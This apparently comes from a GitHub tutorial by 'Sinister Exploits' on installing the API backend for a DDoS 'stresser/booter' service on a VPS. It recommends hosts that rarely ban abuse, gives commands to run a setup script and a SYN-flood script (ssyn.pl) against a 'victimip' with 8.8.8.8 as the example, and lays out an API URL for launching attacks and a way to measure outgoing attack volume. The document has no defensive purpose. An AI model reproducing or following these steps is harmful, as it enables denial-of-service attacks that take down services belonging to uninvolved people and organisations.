# Author: Sinister Exploits
# Version: 1.0
# How to set up an API for your Stresser/Booter


# REQUIREMENTS
To do this, you must have a VPS server that has Centos 6 installed.
You also need the following,
-SSH Putty
-A VPS Server
-A Computer
-A Brain

Here are some of the best VPS servers for doing this, as you do not get banned that easily.

-Hostkey
-VpsGet
-Ecatel
-Ampnode
-Offshoresrv

# INSTRUCTIONS

first login to your vps/dedi with putty on your server.
root/password

login with WinSCP, Filezilla or any type of FTP application to your server.
go to /root/

Download the 5 files that are given in this tutorial.

go to your SSH putty and type:

cd /root/
perl setup.pl
when it asks you to install, just put the key "  y  " for all.

your API should be installed when finished.

ssyn.pl is a simple perl script that will be used to launch your API.

If you want to test this out, you can put this code in your SSH Putty

perl /root/ssyn.pl victimip port sizeofpacket time
example: perl /root/ssyn.pl 8.8.8.8 80 50000 60

Now, go into your internet explorer and put the following:

yourvpsip/api.php
and see if it works.

now we have to add the apikey, the host, the port, the time, and the method.

yourvpsiphere/api.php?key=apikey&host=[host]&port=[port]&time=[time]&method=[method]

If you want to test out the power, go into your SSH Putty and put:

yum -y install dstat
Once installed,
dstat --n
Thean look at the "Send" and that will tell you how much it is sending, if its in the yellow area, usually means that its just over 1 GB of power.

Thats it of the API installation. Please be sure to check out some of my other tutorials here on GitHub.
